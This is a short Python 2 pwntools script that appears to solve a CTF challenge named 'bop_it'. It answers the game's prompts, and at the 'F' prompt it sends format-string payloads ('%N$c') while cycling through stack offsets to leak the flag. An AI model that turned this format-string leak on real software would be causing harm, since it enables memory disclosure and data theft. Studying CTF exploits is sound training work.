from pwn import *

context.log_level="debug"
#s=process("./bop_it")
s=process("./bop_it")
for i in range(1,500):
	# s=remote("shell.actf.co","20702")

	#pty=process.PTY
	# p=process(stdin=pty,stdout=pty)
	with context.local(log_level='ERROR'):
		while (1):
			test=s.recvuntil("it!\n")
			print test
			if(test[0]=='T'):
				s.sendline("T")
				print "T"
			elif(test[0]== 'F'):
				#s.sendline("F"+'%{}$s'.format(i))
				s.sendline("%{}$c".format(i))
				print i
				flag=s.recvall()
				print flag

				if "actf" in flag:
					print flag
					s.interactive()
				break
				
			elif(test[0]== 'B'):
				s.sendline("B")
				print "B"
			elif(test[0]== 'P'):
				s.sendline("P")
				print "P"


print s.recvall()